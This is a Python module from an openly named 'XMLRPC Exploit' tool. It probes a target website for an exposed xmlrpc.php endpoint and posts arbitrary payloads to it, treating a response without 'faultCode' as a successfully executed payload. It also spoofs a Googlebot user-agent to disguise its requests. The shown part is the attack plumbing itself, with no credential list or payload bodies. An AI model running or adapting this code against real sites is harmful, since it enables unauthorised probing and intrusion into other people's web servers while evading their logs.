# XMLRPC Exploit
#
# Author : Relarizky
# Github : @relarizky (https://github.com/relarizky)
# File   : interface.py
# Last Modified : 11/27/20, 13:10 PM
#
# Copyright (c) 2020 Relarizky
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.


import requests


class XmlrpcDoesNotExist(Exception):
    """ raised when xmlrpc.php does not exist on target website """

    pass


class XmlrpcRequester:

    _user_agent = "Googlebot/2.1 (+http://www.google.com/bot.html)"

    def __init__(self, url: str, timeout: int = 10):
        self.url = url
        self.timeout = 10

    # Protected Method
    # Should not be accessed outside the class
    @property
    def _get_status(self) -> bool:
        """ check xmlrpc existence """

        url = self.url + "/xmlrpc.php"
        header = {"user-agent": self._user_agent}
        timeout = self.timeout

        with requests.get(url, timeout=timeout, headers=header) as request:
            if request.status_code != 404:
                if "XML-RPC server accepts POST requests" in request.text:
                    return True
                else:
                    return False
            else:
                return False

    # Protected Methods
    # Should not be accessed outside the class
    def _make_xmlrpc_request(self, post_data: str) -> list:
        """ create request to xmlrpc.php on target website """

        url = self.url + "/xmlrpc.php"
        header = {"user-agent": self._user_agent}
        timeout = self.timeout

        request = requests.post(url=url, headers=header,
                                data=post_data,
                                timeout=timeout)

        if request.status_code != 404:
            if "faultCode" not in request.text:
                # request successfull (payload executed without error return)
                return_data = request.text
            else:
                # request unsuccessfull (payload executed with error return)
                return_data = None
        else:
            return_data = None

        request.close()
        return return_data
